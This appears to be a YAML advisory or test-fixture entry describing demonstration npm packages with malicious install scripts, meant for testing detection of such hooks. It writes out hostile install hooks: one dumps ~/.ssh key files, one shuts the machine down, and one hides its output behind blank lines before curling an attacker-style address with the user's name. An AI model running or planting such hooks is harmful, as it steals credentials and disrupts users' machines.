  title: Malicious Package
  description: |+
    `harmlesspackage` is a malicious package that is used to demonstrate or
    test malicious install scripts. These scripts can send your local ssh
    file to an attacker, or download malicious files and run them in the
    background.

    This is especially dangerous in production runtime environments, where
    environment variables tend to consist of keys, passwords, tokens and
    other secrets.

    The list of packages and their scripts are:

        {
          "name": "maybemaliciouspackage",
          "scripts": {
            "postinstall": "find ~/.ssh | xargs cat || true && echo '\n\n\n\n\n\nOH HEY LOOK SSH KEYS\n\n\n\n\n\n\n'"
          }
        },
        {
          "name": "deasyncp",
          "scripts": {
            "preinstall": "say U WOT M8; shutdown -s now"
          }
        },
        {
          "name": "harmlesspackage",
          "scripts": {
            "postinstall": "echo '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThanks for your SSH         keys :)' && curl -X GET http://1.3.3.7:1337/\\?$(whoami)"
